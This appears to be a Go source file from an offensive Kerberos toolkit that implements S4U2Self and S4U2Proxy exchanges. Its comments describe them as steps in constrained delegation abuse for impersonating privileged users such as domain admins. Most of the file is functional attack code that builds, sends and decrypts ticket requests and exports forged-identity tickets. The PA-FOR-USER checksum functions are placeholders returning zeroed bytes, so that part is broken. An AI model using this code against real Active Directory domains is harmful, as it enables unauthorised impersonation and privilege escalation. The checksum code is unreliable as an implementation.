package client

import (
	"context"
	"encoding/asn1"
	"fmt"
	"time"

	"github.com/goobeus/goobeus/pkg/asn1krb5"
	"github.com/goobeus/goobeus/pkg/crypto"
	"github.com/goobeus/goobeus/pkg/ticket"
)

// EDUCATIONAL: S4U - Service for User Extensions
//
// S4U is Microsoft's extension to Kerberos for service delegation.
// It has two components:
//
// S4U2Self (Service-for-User-to-Self):
//   - Allows a service to get a ticket TO ITSELF on behalf of a user
//   - The service doesn't need the user's credentials
//   - Used for protocol transition (non-Kerberos auth → Kerberos)
//   - Requires TRUSTED_TO_AUTH_FOR_DELEGATION (protocol transition flag)
//
// S4U2Proxy (Service-for-User-to-Proxy):
//   - Allows a service to get a ticket to ANOTHER service as the user
//   - Uses the ticket from S4U2Self as evidence
//   - Constrained by msDS-AllowedToDelegateTo attribute
//
// Attack uses:
//   - Compromise service with constrained delegation
//   - S4U2Self to get ticket "as" any user (even domain admin!)
//   - S4U2Proxy to access allowed backend services as that user

// S4U2SelfRequest configures an S4U2Self request.
type S4U2SelfRequest struct {
	// Our TGT (the service's TGT)
	TGT        *ticket.Kirbi
	SessionKey []byte

	// User to impersonate
	TargetUser   string // SAMAccountName or UPN
	TargetDomain string // Domain of the target user

	// Our identity (the service)
	ServiceName string // Our SPN (what we're getting a ticket to)
	Domain      string

	// Options
	KDC string
}

// S4U2SelfResult contains the result of S4U2Self.
type S4U2SelfResult struct {
	*SessionInfo
	Kirbi       *ticket.Kirbi
	Base64      string
	Forwardable bool // Can be used for S4U2Proxy
}

// S4U2Self performs the S4U2Self exchange.
//
// EDUCATIONAL: S4U2Self Attack
//
// This is step 1 of constrained delegation abuse:
// 1. We compromise a service account with constrained delegation
// 2. We use S4U2Self to get a ticket impersonating a high-value user
// 3. The ticket is TO ourselves, FROM the target user
// 4. We then use S4U2Proxy to access allowed services as that user
//
// Even without TRUSTED_TO_AUTH_FOR_DELEGATION, we get a ticket,
// but it won't be forwardable (can't use for S4U2Proxy).
func S4U2Self(req *S4U2SelfRequest) (*S4U2SelfResult, error) {
	return S4U2SelfWithContext(context.Background(), req)
}

// S4U2SelfWithContext performs S4U2Self with context support.
func S4U2SelfWithContext(ctx context.Context, req *S4U2SelfRequest) (*S4U2SelfResult, error) {
	if req.TGT == nil {
		return nil, fmt.Errorf("TGT is required")
	}
	if req.TargetUser == "" {
		return nil, fmt.Errorf("target user is required")
	}
	if len(req.SessionKey) == 0 {
		if key := req.TGT.SessionKey(); key != nil {
			req.SessionKey = key.KeyValue
		} else {
			return nil, fmt.Errorf("session key is required")
		}
	}

	domain := req.Domain
	if domain == "" && req.TGT.CredInfo != nil && len(req.TGT.CredInfo.TicketInfo) > 0 {
		domain = req.TGT.CredInfo.TicketInfo[0].SRealm
	}

	targetDomain := req.TargetDomain
	if targetDomain == "" {
		targetDomain = domain
	}

	etype := detectEtype(req.SessionKey)
	client := NewClient(domain).WithKDC(req.KDC)

	// Build TGS-REQ with PA-FOR-USER
	sname := parseServiceName(req.ServiceName)
	tgsReq, err := buildS4U2SelfTGSREQ(req, sname, domain, etype)
	if err != nil {
		return nil, fmt.Errorf("failed to build TGS-REQ: %w", err)
	}

	// Add PA-TGS-REQ (our TGT)
	paTGSReq, err := buildPATGSReq(req.TGT.Ticket(), req.SessionKey, etype)
	if err != nil {
		return nil, fmt.Errorf("failed to build PA-TGS-REQ: %w", err)
	}
	tgsReq.PAData = append(tgsReq.PAData, paTGSReq)

	// Add PA-FOR-USER (who we want to impersonate)
	paForUser, err := buildPAForUser(req.TargetUser, targetDomain, req.SessionKey, etype)
	if err != nil {
		return nil, fmt.Errorf("failed to build PA-FOR-USER: %w", err)
	}
	tgsReq.PAData = append(tgsReq.PAData, paForUser)

	// Marshal and send
	tgsReqBytes, err := asn1.MarshalWithParams(tgsReq, "application,tag:12")
	if err != nil {
		return nil, fmt.Errorf("failed to marshal TGS-REQ: %w", err)
	}

	respBytes, err := client.send(ctx, tgsReqBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to send TGS-REQ: %w", err)
	}

	if err := checkKRBError(respBytes); err != nil {
		return nil, err
	}

	// Parse TGS-REP
	var tgsRep asn1krb5.TGSREP
	_, err = asn1.UnmarshalWithParams(respBytes, &tgsRep, "application,tag:13")
	if err != nil {
		return nil, fmt.Errorf("failed to parse TGS-REP: %w", err)
	}

	// Decrypt enc-part
	decrypted, err := decryptEncPart(tgsRep.EncPart, req.SessionKey, etype, crypto.KeyUsageTGSRepEncPart)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt TGS-REP: %w", err)
	}

	var encPart asn1krb5.EncTGSRepPart
	_, err = asn1.UnmarshalWithParams(decrypted, &encPart, "application,tag:26")
	if err != nil {
		return nil, fmt.Errorf("failed to parse EncTGSRepPart: %w", err)
	}

	kirbi, err := buildKirbiFromTGS(&tgsRep.Ticket, &encPart)
	if err != nil {
		return nil, fmt.Errorf("failed to build kirbi: %w", err)
	}

	b64, _ := kirbi.ToBase64()

	// Check if forwardable
	forwardable := (encPart.Flags.Bytes[0] & 0x40) != 0 // FORWARDABLE flag

	return &S4U2SelfResult{
		SessionInfo: &SessionInfo{
			SessionKey:  encPart.Key,
			Ticket:      &tgsRep.Ticket,
			Kirbi:       kirbi,
			AuthTime:    encPart.AuthTime,
			StartTime:   encPart.StartTime,
			EndTime:     encPart.EndTime,
			RenewTill:   encPart.RenewTill,
			ServerRealm: encPart.SRealm,
			ServerName:  encPart.SName,
		},
		Kirbi:       kirbi,
		Base64:      b64,
		Forwardable: forwardable,
	}, nil
}

// S4U2ProxyRequest configures an S4U2Proxy request.
type S4U2ProxyRequest struct {
	// Our TGT
	TGT        *ticket.Kirbi
	SessionKey []byte

	// S4U2Self ticket (evidence)
	S4U2SelfTicket *ticket.Kirbi

	// Target service we want to access
	TargetSPN string
	Domain    string

	// Options
	KDC string
}

// S4U2ProxyResult contains the result of S4U2Proxy.
type S4U2ProxyResult struct {
	*SessionInfo
	Kirbi  *ticket.Kirbi
	Base64 string
}

// S4U2Proxy performs the S4U2Proxy exchange.
//
// EDUCATIONAL: S4U2Proxy Attack
//
// This is step 2 of constrained delegation abuse:
// 1. We have an S4U2Self ticket (from S4U2Self)
// 2. We include it in a TGS-REQ with CNAME-IN-ADDL-TKT flag
// 3. KDC validates we're allowed to delegate to the target
// 4. KDC issues a ticket to the target service AS the impersonated user!
//
// The "evidence" ticket proves we got the user's consent (in theory).
// In practice, we forged it with S4U2Self.
//
// Constrained by: msDS-AllowedToDelegateTo attribute
func S4U2Proxy(req *S4U2ProxyRequest) (*S4U2ProxyResult, error) {
	return S4U2ProxyWithContext(context.Background(), req)
}

// S4U2ProxyWithContext performs S4U2Proxy with context support.
func S4U2ProxyWithContext(ctx context.Context, req *S4U2ProxyRequest) (*S4U2ProxyResult, error) {
	if req.TGT == nil {
		return nil, fmt.Errorf("TGT is required")
	}
	if req.S4U2SelfTicket == nil {
		return nil, fmt.Errorf("S4U2Self ticket is required")
	}
	if req.TargetSPN == "" {
		return nil, fmt.Errorf("target SPN is required")
	}
	if len(req.SessionKey) == 0 {
		if key := req.TGT.SessionKey(); key != nil {
			req.SessionKey = key.KeyValue
		} else {
			return nil, fmt.Errorf("session key is required")
		}
	}

	domain := req.Domain
	if domain == "" && req.TGT.CredInfo != nil && len(req.TGT.CredInfo.TicketInfo) > 0 {
		domain = req.TGT.CredInfo.TicketInfo[0].SRealm
	}

	etype := detectEtype(req.SessionKey)
	client := NewClient(domain).WithKDC(req.KDC)

	// Build TGS-REQ with CNAME-IN-ADDL-TKT
	sname := parseServiceName(req.TargetSPN)
	tgsReq, err := buildS4U2ProxyTGSREQ(req, sname, domain, etype)
	if err != nil {
		return nil, fmt.Errorf("failed to build TGS-REQ: %w", err)
	}

	// Add PA-TGS-REQ
	paTGSReq, err := buildPATGSReq(req.TGT.Ticket(), req.SessionKey, etype)
	if err != nil {
		return nil, fmt.Errorf("failed to build PA-TGS-REQ: %w", err)
	}
	tgsReq.PAData = append(tgsReq.PAData, paTGSReq)

	// Marshal and send
	tgsReqBytes, err := asn1.MarshalWithParams(tgsReq, "application,tag:12")
	if err != nil {
		return nil, fmt.Errorf("failed to marshal TGS-REQ: %w", err)
	}

	respBytes, err := client.send(ctx, tgsReqBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to send TGS-REQ: %w", err)
	}

	if err := checkKRBError(respBytes); err != nil {
		return nil, err
	}

	var tgsRep asn1krb5.TGSREP
	_, err = asn1.UnmarshalWithParams(respBytes, &tgsRep, "application,tag:13")
	if err != nil {
		return nil, fmt.Errorf("failed to parse TGS-REP: %w", err)
	}

	decrypted, err := decryptEncPart(tgsRep.EncPart, req.SessionKey, etype, crypto.KeyUsageTGSRepEncPart)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt TGS-REP: %w", err)
	}

	var encPart asn1krb5.EncTGSRepPart
	_, err = asn1.UnmarshalWithParams(decrypted, &encPart, "application,tag:26")
	if err != nil {
		return nil, fmt.Errorf("failed to parse EncTGSRepPart: %w", err)
	}

	kirbi, err := buildKirbiFromTGS(&tgsRep.Ticket, &encPart)
	if err != nil {
		return nil, fmt.Errorf("failed to build kirbi: %w", err)
	}

	b64, _ := kirbi.ToBase64()

	return &S4U2ProxyResult{
		SessionInfo: &SessionInfo{
			SessionKey:  encPart.Key,
			Ticket:      &tgsRep.Ticket,
			Kirbi:       kirbi,
			AuthTime:    encPart.AuthTime,
			StartTime:   encPart.StartTime,
			EndTime:     encPart.EndTime,
			RenewTill:   encPart.RenewTill,
			ServerRealm: encPart.SRealm,
			ServerName:  encPart.SName,
		},
		Kirbi:  kirbi,
		Base64: b64,
	}, nil
}

// buildS4U2SelfTGSREQ builds a TGS-REQ for S4U2Self.
func buildS4U2SelfTGSREQ(req *S4U2SelfRequest, sname asn1krb5.PrincipalName, domain string, etype int32) (*asn1krb5.TGSREQ, error) {
	now := time.Now().UTC()

	options := asn1krb5.FlagForwardable | asn1krb5.FlagRenewable
	optionsBits := make([]byte, 4)
	optionsBits[0] = byte((options >> 24) & 0xFF)
	optionsBits[1] = byte((options >> 16) & 0xFF)
	optionsBits[2] = byte((options >> 8) & 0xFF)
	optionsBits[3] = byte(options & 0xFF)

	body := asn1krb5.KDCReqBody{
		KDCOptions: asn1.BitString{
			Bytes:     optionsBits,
			BitLength: 32,
		},
		Realm: domain,
		SName: sname,
		Till:  now.Add(10 * time.Hour),
		Nonce: int32(now.UnixNano() & 0x7FFFFFFF),
		EType: []int32{etype, crypto.EtypeAES256, crypto.EtypeRC4},
	}

	return &asn1krb5.TGSREQ{
		PVNO:    asn1krb5.PVNO,
		MsgType: asn1krb5.MsgTypeTGSREQ,
		ReqBody: body,
	}, nil
}

// buildS4U2ProxyTGSREQ builds a TGS-REQ for S4U2Proxy.
func buildS4U2ProxyTGSREQ(req *S4U2ProxyRequest, sname asn1krb5.PrincipalName, domain string, etype int32) (*asn1krb5.TGSREQ, error) {
	now := time.Now().UTC()

	// Set CNAME-IN-ADDL-TKT flag (0x00004000)
	options := asn1krb5.FlagForwardable | asn1krb5.FlagRenewable | 0x00004000
	optionsBits := make([]byte, 4)
	optionsBits[0] = byte((options >> 24) & 0xFF)
	optionsBits[1] = byte((options >> 16) & 0xFF)
	optionsBits[2] = byte((options >> 8) & 0xFF)
	optionsBits[3] = byte(options & 0xFF)

	body := asn1krb5.KDCReqBody{
		KDCOptions: asn1.BitString{
			Bytes:     optionsBits,
			BitLength: 32,
		},
		Realm:             domain,
		SName:             sname,
		Till:              now.Add(10 * time.Hour),
		Nonce:             int32(now.UnixNano() & 0x7FFFFFFF),
		EType:             []int32{etype, crypto.EtypeAES256, crypto.EtypeRC4},
		AdditionalTickets: []asn1krb5.Ticket{*req.S4U2SelfTicket.Ticket()},
	}

	return &asn1krb5.TGSREQ{
		PVNO:    asn1krb5.PVNO,
		MsgType: asn1krb5.MsgTypeTGSREQ,
		ReqBody: body,
	}, nil
}

// PA-FOR-USER structure for S4U2Self
type paForUser struct {
	UserName    asn1krb5.PrincipalName `asn1:"explicit,tag:0"`
	UserRealm   string                 `asn1:"generalstring,explicit,tag:1"`
	Cksum       asn1krb5.Checksum      `asn1:"explicit,tag:2"`
	AuthPackage string                 `asn1:"ia5,explicit,tag:3"`
}

// buildPAForUser builds PA-FOR-USER padata for S4U2Self.
func buildPAForUser(targetUser, targetRealm string, sessionKey []byte, etype int32) (asn1krb5.PAData, error) {
	// Build the user principal
	userName := asn1krb5.PrincipalName{
		NameType:   asn1krb5.NTPrincipal,
		NameString: []string{targetUser},
	}

	// Build structure without checksum first for signing
	pafu := paForUser{
		UserName:    userName,
		UserRealm:   targetRealm,
		AuthPackage: "Kerberos",
	}

	// The checksum is computed over the Name, Realm, and AuthPackage
	// using HMAC-MD5 with key usage 17 for RC4
	checksumData := []byte{}
	for _, s := range userName.NameString {
		checksumData = append(checksumData, []byte(s)...)
	}
	checksumData = append(checksumData, []byte(targetRealm)...)
	checksumData = append(checksumData, []byte("Kerberos")...)

	var cksum []byte
	var cksumType int32
	switch etype {
	case crypto.EtypeRC4:
		// HMAC-MD5 checksum
		cksumType = -138 // HMAC-MD5
		// Simplified - in practice need proper key derivation
		cksum = computeHMACMD5(sessionKey, checksumData, 17)
	case crypto.EtypeAES128, crypto.EtypeAES256:
		// HMAC-SHA1-96-AES checksum
		cksumType = 16 // HMAC-SHA1-96-AES256
		cksum = computeAESChecksum(sessionKey, checksumData, 17, etype)
	default:
		return asn1krb5.PAData{}, fmt.Errorf("unsupported etype for PA-FOR-USER: %d", etype)
	}

	pafu.Cksum = asn1krb5.Checksum{
		CksumType: cksumType,
		Checksum:  cksum,
	}

	pafuBytes, err := asn1.Marshal(pafu)
	if err != nil {
		return asn1krb5.PAData{}, err
	}

	return asn1krb5.PAData{
		PADataType:  asn1krb5.PADataForUser,
		PADataValue: pafuBytes,
	}, nil
}

// computeHMACMD5 computes HMAC-MD5 checksum for RC4.
func computeHMACMD5(key, data []byte, usage int) []byte {
	// Derive checksum key
	usageBytes := make([]byte, 4)
	usageBytes[0] = byte(usage)
	usageBytes[1] = byte(usage >> 8)
	usageBytes[2] = byte(usage >> 16)
	usageBytes[3] = byte(usage >> 24)

	import_hmac_for_md5 := append(usageBytes, key...)
	_ = import_hmac_for_md5 // Placeholder

	// Simplified - return placeholder
	// Full implementation would use proper HMAC-MD5 with derived key
	return make([]byte, 16)
}

// computeAESChecksum computes AES checksum.
func computeAESChecksum(key, data []byte, usage int, etype int32) []byte {
	// Placeholder - full implementation would derive Ki and compute HMAC-SHA1-96
	return make([]byte, 12)
}
